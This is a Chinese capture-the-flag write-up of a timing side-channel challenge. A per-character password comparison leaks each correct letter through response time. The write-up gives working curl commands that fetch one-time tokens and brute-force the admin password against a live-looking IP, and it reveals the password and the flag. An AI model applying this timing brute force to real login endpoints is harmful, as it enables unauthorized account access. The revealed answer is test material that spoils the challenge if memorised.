# 14-brute-token-timing

## 漏洞点

首页提示：

- 先 `GET /api/token` 获取一次性 token
- 再 `POST /api/login` 登录
- 用户名是 `admin`
- 密码是 6 位小写字母
- 响应时间可能携带信息

实际漏洞是后端比较密码时类似逐字符比较：

```js
for i in password:
    if input[i] != password[i]:
        return false
    sleep(...)
```

所以猜中的前缀越长，请求耗时越久，可以一位一位爆破密码。

## 手工复刻

### 1. 获取 token

```bash
curl -s http://47.120.76.57:33859/api/token
```

返回类似：

```json
{ "token": "f01ab5b843fa390dffc58386" }
```

注意：token 是一次性的，每次登录都要重新拿。

### 2. 登录接口

```bash
curl -s -X POST http://47.120.76.57:33859/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"aaaaaa","token":"这里换成新token"}'
```

密码错时：

```json
{ "ok": false, "msg": "invalid credential" }
```

### 3. 用时间差猜密码

密码长度是 6，字符范围是：

```text
abcdefghijklmnopqrstuvwxyz
```

先猜第一位，例如：

```text
aaaaaa
baaaaa
caaaaa
...
saaaaa
...
```

每次请求前都重新获取 token，然后测 `/api/login` 的耗时。

耗时最高的是正确前缀。

本题逐位结果：

```text
第1位：s
第2位：h
第3位：a
第4位：d
第5位：o
第6位：w
```

所以密码是：

```text
shadow
```

### 4. 拿 flag

先拿新 token：

```bash
TOKEN=$(curl -s http://47.120.76.57:33859/api/token | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
```

再用密码 `shadow` 登录：

```bash
curl -s -X POST http://47.120.76.57:33859/api/login \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin\",\"password\":\"shadow\",\"token\":\"$TOKEN\"}"
```

得到：

```text
TOGOGO-flag{d5064009-3013-4990-b551-a2f443205641}
```
